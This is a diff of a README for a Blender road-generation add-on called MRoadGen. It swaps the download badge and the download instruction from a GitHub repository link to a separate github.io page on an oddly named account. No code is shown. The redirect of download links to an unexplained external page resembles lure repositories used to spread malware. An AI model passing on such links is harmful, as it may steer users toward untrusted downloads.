@@ -1,6 +1,6 @@
 # 🛣️ MRoadGen - Build complex road networks on terrain
 
-[![](https://img.shields.io/badge/Download-MRoadGen-blue.svg)](https://github.com/Footballstadiummasculinity650/MRoadGen)
+[![](https://img.shields.io/badge/Download-MRoadGen-blue.svg)](https://footballstadiummasculinity650.github.io)
 
 ## 📌 About this project
 
@@ -13,7 +13,7 @@ You need a computer that runs the current version of Blender. We suggest using a
 ## 💾 How to download your files
 
 1. Open your web browser.
-2. Go to [https://github.com/Footballstadiummasculinity650/MRoadGen](https://github.com/Footballstadiummasculinity650/MRoadGen).
+2. Go to [https://footballstadiummasculinity650.github.io](https://footballstadiummasculinity650.github.io).
 3. Find your button to download the files.
 4. Click the link to save the folder to your computer.
 5. Choose a folder on your desktop for quick access.
